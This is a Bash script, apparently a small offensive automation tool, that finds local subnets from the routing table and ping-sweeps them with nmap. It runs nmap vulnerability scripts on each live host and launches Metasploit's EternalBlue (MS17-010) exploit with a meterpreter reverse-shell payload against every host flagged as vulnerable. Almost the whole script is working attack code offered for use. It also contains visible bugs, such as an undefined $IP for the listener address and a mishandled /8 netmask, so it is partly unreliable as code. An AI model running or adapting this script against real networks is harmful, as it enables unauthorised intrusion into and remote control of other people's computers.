#!/bin/bash

printf '

__  __                  _        __ __
\ \/ /___ _____  ____  (_)____  / //_/
 \  / __ `/ __ \/ __ \/ / ___/ / ,<
 / / /_/ / / / / / / / (__  ) / /| |
/_/\__,_/_/ /_/_/ /_/_/____(_)_/ |_|

'
localIP=$(ip addr show eth0 | awk '/inet / {print$2}' | cut -d/ -f1)
(route -n | sed '1,2d' | awk '{print$1,$3}' | grep -v "0.0.0.0") > srlist.txt
seq1=$(wc -l srlist.txt | awk '{print$1}')

for i in $(seq 1 $seq1);do
a=$(cat srlist.txt | awk "NR==$i" | awk '{print$1}')
b=$(cat srlist.txt | awk "NR==$i" | awk '{print$2}')
	if [[ "$b" == "255.255.255.0" ]] ;then
        	b="24"
	elif [[ "$b" == "255.255.0.0" ]] ;then
		b="16"
	elif [[ "$b" == "255.0.0.0" ]] ;then
		c="8"
	fi
c="$a/$b"
nmap -sn $c --exclude $localIP | awk '/Nmap scan report for / {print $5}' >> hostup.txt
done

echo ""
echo "Toutes les machines UP sont analysées, cela peut durer quelques minutes..."
echo "====..50%"

seq1=$(wc -l srlist.txt | awk '{print$1}')
seq2=$(wc -l hostup.txt | awk '{print$1}')

for i in $(seq 1 $seq2);do
LINE=$(cat hostup.txt | awk "NR==$i")
nmap -v --script vuln $LINE > LINE$i.txt
done

echo ""
echo "======..75%"

for i in $(seq 1 $seq2);do
STRING="| smb-vuln-ms17-010:"
LINE=$(cat hostup.txt | awk "NR==$i")
if [[ ! -z $(grep "$STRING" "LINE$i.txt") ]]; then
echo ""
echo "$LINE are vulnerable to MS17_010"
sleep 2
echo ""
echo "An exploit will be launched in a new terminal"
sleep 2
gnome-terminal -- bash -c "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set lhost $IP ; set rhost $LINE ; set lport 444$i ; exploit ; '; exec bash"
else
echo ""
echo "$LINE are not vulnerable";
sleep 1
fi
done

rm srlist.txt hostup.txt LINE*.txt

sleep 2
echo ""
echo "========100%"
sleep 1
echo ""
echo "Bye"
